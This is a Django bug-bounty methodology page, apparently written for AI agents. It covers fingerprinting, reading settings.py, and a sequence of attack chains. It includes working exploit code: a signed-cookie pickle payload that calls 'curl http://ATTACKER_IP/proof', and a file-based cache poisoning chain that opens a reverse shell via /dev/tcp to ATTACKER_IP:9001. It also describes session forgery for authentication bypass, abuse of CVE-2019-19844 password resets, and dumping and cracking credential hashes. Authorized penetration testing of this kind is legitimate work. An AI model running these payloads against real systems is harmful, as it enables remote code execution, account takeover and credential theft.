---
technology: Django
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "9 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 9 writeups in the writeup corpus + upstream-verified: docs.djangoproject.com settings/deployment-checklist pages (DEBUG masking keywords, SECRET_KEY guidance, SECRET_KEY_FALLBACKS), Django security weblog 2019-12-18 + NVD CVE-2019-19844 (version ranges), Django 4.1 deprecation timeline / 5.0 release notes (PickleSerializer), django/views/debug.py. Accessed 2026-11-12"
---

Companion page: [[django|Django overview]] — what the framework is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Django Bug Bounty Methodology

**Scope:** Django deployments of any version — configuration, source disclosure, `SECRET_KEY` forgery chains, the Django ORM database (`auth_user`, `django_session`, `django_admin_log`), the admin site, and Django app-server deployment artifacts (`manage.py`, `wsgi.py`). **Out of scope:** generic Python bugs with no Django dependency; the OAuth protocol itself (this unit covers the Django deployment of it); the database engines (mysql/postgres units).

**Authorization:** presume written permission. Cookie-forgery phases create sessions for accounts that are not yours — treat every forged-cookie test as an account login and confirm the engagement rules cover it. Prefer demonstrating with a benign marker (`{"visited":"pentest"}`) over privileged pivots until impact needs proving.

## Decision tree (one screen)

1. Django confirmed (cookies `/admin/login/?next=/admin/`, `csrftoken`+`sessionid`, `Bad Request (400)` blankpage, wsgi.py in server config) → Phase 2.
2. Any source read → Phase 3 (`settings.py` loot table) → if `SECRET_KEY` + `SESSION_ENGINE=signed_cookies` + `PickleSerializer` → Phase 4 (forgery RCE).
3. Database access → Phase 5 (`auth_user` hashes, hashcat 10000/124, `is_staff`).
4. Admin reachable + creds → Phase 6 (admin surface, including non-default extensions).
5. Django-as-OAuth-server (`/o/token/`) → Phase 7 (token flow abuse).

## Phase 1 — Fingerprinting

```bash
curl -si http://example.com/admin/            # 302 → /admin/login/?next=/admin/ (Django admin)
curl -s http://example.com/ -H 'Host: invalid' # DEBUG=False + empty ALLOWED_HOSTS → plain "Bad Request (400)"
```

Tells: `Cookies[csrftoken...]` on first response (whatweb); `Title[Log in | Django site admin]`; project paths in web-server configs — `WSGIScriptAlias / /var/www/<project>/wsgi.py`, `WSGIDaemonProcess <project> python-path=...` (seen in a recovered web-server config); `manage.py` in a directory listing; `python3 manage.py dbshell` in recovered shell history. Version: rarely on the wire — look in source (`django/__init__.py`, requirements files) or pip metadata.

## Phase 2 — Source/config read paths (every observed chain started here)

| Path | Observed form |
|---|---|
| Adjacent-service config disclosure | Grafana datasource provisioning → MySQL → Django app code + settings |
| Database pivot → app source on disk | `/var/www/<project>/`, `settings.py`, `views.py` (`settings.py` named the app path `/var/www/malscanner/`) |
| Web-server config | Apache `wsgi.py` blocks reveal project paths and daemon users |
| LFI/arbitrary-read in the app itself | any read primitive → `manage.py`-adjacent tree |
| On-host project directories | readable after foothold — grep for `SECRET_KEY`, `settings`, `manage.py` |

## Phase 3 — settings.py loot table

Read it in this order:

- `SECRET_KEY` (and `SECRET_KEY_FALLBACKS` on 4.2+ — old keys stay valid until removed) → forgery prerequisite.
- `SESSION_ENGINE` — `signed_cookies` means sessions live client-side, forgeable with the key; `cache`/`filebased`/`db` means server-side (see Phase 4b for the file-based cache variant).
- `SESSION_SERIALIZER` — `PickleSerializer` (≤4.0 default-able, removed in 5.0) converts key leak to RCE; `JSONSerializer` only to session-data forgery.
- `DEBUG` — if `True`, you already have the traceback oracle; note the 500 page still masks `KEY`/`SECRET`/`PASS`-named settings.
- Databases block (`ENGINE`, `HOST`, credentials), `CACHES` (`LOCATION` — observed: `/var/tmp/django_cache`), `INSTALLED_APPS` (third-party surface), custom app settings.

## Phase 4 — SECRET_KEY forgery chains

**4a. Signed-cookie session forgery → pickle RCE** (observed: two engagements, identical chain three years apart):

```python
import django.core.signing
from django.contrib.sessions.serializers import PickleSerializer

class PickleRce:
    def __reduce__(self):
        return (__import__('os').system, ('curl http://ATTACKER_IP/proof',))

cookie = django.core.signing.dumps(
    PickleRce(),
    key=SECRET_KEY,
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies')
# send as the sessionid cookie; any authenticated view unpickles it
```

The `salt` string is fixed — `'django.contrib.sessions.backends.signed_cookies'`. Version-gate: gadget works where `PickleSerializer` is selected AND the pickle executes in the request path (observed boxes ran ≤3.x-era stacks; on JSON-serializer targets downgrade to session-data forgery: dump a plain dict `{'_auth_user_id':'1','_auth_user_backend':'django.contrib.auth.backends.ModelBackend'}` — auth bypass, no RCE).

**4b. FileBasedCache poisoning** (field-observed) — `CACHES` with `'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache'` and a shared/writable `LOCATION` (observed mode 0777): cache values are serialized blobs (`<md5>.djcache` files); a local user who can write the directory can poison entries (session/user data or deserialization on load). Check `ls -la` on the cache path.

**4c. Password-reset token forgery [upstream, not observed in the field]** — reset tokens are HMACs over `SECRET_KEY`-derived key + user fields (`pk`, `last_login`, password hash, timestamp). With the key AND a database read you can mint valid tokens offline and reset any account without email access. For <1.11.27 / 2.2.x <2.2.9 / 3.0 <3.0.1 (CVE-2019-19844) you do not need the key at all: submit a Unicode-case-collision email (e.g. Turkish dotless-i forms) to `/password_reset/` and the pre-patch code sends the real account's token to your address. Fixed versions send the token only to the address on record.

**4d. FileBasedCache pickle deserialization → RCE (world-writable cache dir)** — Phase 4b's precondition weaponized end-to-end. Django's file-based cache pickles everything it stores; the docs warn verbatim that an attacker who gains access to a cache file "can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle". Entries land as `<32-hex>.djcache` files (MD5 of the cache key); on disk the layout is a pickled expiry timestamp followed by the zlib-compressed pickle of the value (`django/core/cache/backends/filebased.py`), and *both* are unpickled on read — the first `pickle.load` that touches a planted file already executes it.

```bash
# 1. Precondition: a cache directory your current shell user can write (0777 shared dir)
ls -ld /var/tmp/django_cache
# drwxrwxrwx 2 appuser www-data 4096 ... django_cache

# 2. Prime the cache — request a cached view, then take the new filename
curl -s http://198.51.100.10/explore >/dev/null; ls -l /var/tmp/django_cache/
# -rw------- 1 appuser www-data 2776 ... 90dbab8f3b1e54369abdeb4ba1efc106.djcache

# 3. Forge the entry: __reduce__ payload in place of the cached object
python3 - <<'EOF'
import pickle, subprocess
class EvilPickle:
    def __reduce__(self):
        return (subprocess.Popen, (["/bin/bash", "-c",
            "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"],))
open('/tmp/90dbab8f3b1e54369abdeb4ba1efc106.djcache', 'wb').write(pickle.dumps(EvilPickle()))
EOF

# 4. Drop it in (entry files are 0600 appuser-owned — mv prompts to override)
mv /tmp/90dbab8f3b1e54369abdeb4ba1efc106.djcache /var/tmp/django_cache/
# mv: replace '...djcache', overriding mode 0600 (rw-------)? y

# 5. Trigger: reload the cached URL — the web app's process unpickles it
nc -lvnp 9001 &
curl -s http://198.51.100.10/explore >/dev/null
# connect from the target → appuser@target:/var/www/project$ id
# uid=…(appuser) gid=…(www-data) groups=…(www-data)
```

Notes: deserialization runs as the **web application's user**, not the
cache-dir owner — the payoff is lateral movement to that account (app source,
backups, database credentials it can read), then continue up. Priming the
cache and copying the created filename sidesteps key→filename computation
entirely and adapts to whatever on-disk layout the target's Django version
writes (newer releases zlib-compress the value behind the pickled expiry
header; mirror the layout you observed when forging).

## Phase 5 — Database loot

```sql
SELECT username, email, is_staff, is_superuser, password FROM auth_user;
SELECT * FROM django_session LIMIT 5;
SELECT user_id, action_time, object_repr FROM django_admin_log ORDER BY action_time DESC LIMIT 20;
```

- Hash formats: `pbkdf2_sha256$<iterations>$<salt>$<b64>` → hashcat `-m 10000`; legacy `sha1$<salt>$<hash>` → `-m 124`. Both were cracked in the field; PBKDF2 iterations grow with Django versions (one engagement skipped cracking PBKDF2 as too expensive — weigh `is_staff` value before burning GPU time).
- `django_session` rows: base64 session blobs — past session data (user ids, role flags) leaks what the app trusts; with `signed_cookies` engine this table is absent (sessions are on clients).
- `django_admin_log`: admin actions = recon of privileged users and what they touch.
- `django_migrations`: the exact app list and Django-era fingerprint when source is unavailable.

## Phase 6 — Admin surface

- Stock admin: `/admin/login/` — creds from Phase 5 (`is_staff=1`), forged cookie from 4a (`_auth_user_id` of a staff user). Post-auth: model CRUD, raw-id widgets (IDOR-ish enumeration of related objects), saved model history.
- **Non-default admin extensions are the jackpot**: one observed deployment had a "Development Tools" section shipped in the admin panel with a **SQL Terminal** — one click from staff login to arbitrary SQL. Enumerate every admin section against what stock Django ships (`django.contrib.admin` adds only app/model groups and site actions).

## Phase 7 — Django-as-OAuth-server (app layer)

Where the target runs django-oauth-toolkit (field-observed: separate authorization vhost on :8000): enumerate `/o/authorize/`, `/o/token/`, `/o/applications/`; the flows are standard OAuth2 but Django-specific loot is the `oauth2_provider_*` tables and the admin registration form (self-service client registration = client-id issuance). Token requests: `grant_type=authorization_code&client_id=<id>&client_secret=<secret>` against `/o/token/`.

## Disclosure notes

- Never report "SECRET_KEY leaked = critical" flat: on `JSONSerializer` + server-side sessions the impact is often only session-data forgery; the RCE claim needs the serializer setting in evidence.
- Version-gate CVE-2019-19844 (verify < 1.11.27 / 2.2.9 / 3.0.1 via source/pip metadata, not assumption).
- State whether the debug-page masking applied: a 500 page showing plaintext `SECRET_KEY` means an ancient Django — that version fact belongs in the report.
- Admin SQL-terminal extensions: report as authenticated-RCE-equivalent with the required role named.

## Appendix A — Tool mapping (prose)

- **curl** — fingerprinting, admin probing, forged-cookie replay.
- **hashcat** — `-m 10000` Django PBKDF2-SHA256, `-m 124` Django SHA-1 (field-confirmed modes).
- **sqlite3 / mysql / psql clients** — ORM table dumps (`auth_user`, `django_session`, `django_admin_log`).
- **python3 + django.core.signing** — the forgery primitive itself; run in a venv with the target's Django version for byte-identical signing.
- **Burp Suite** — admin extension enumeration, OAuth flow capture.
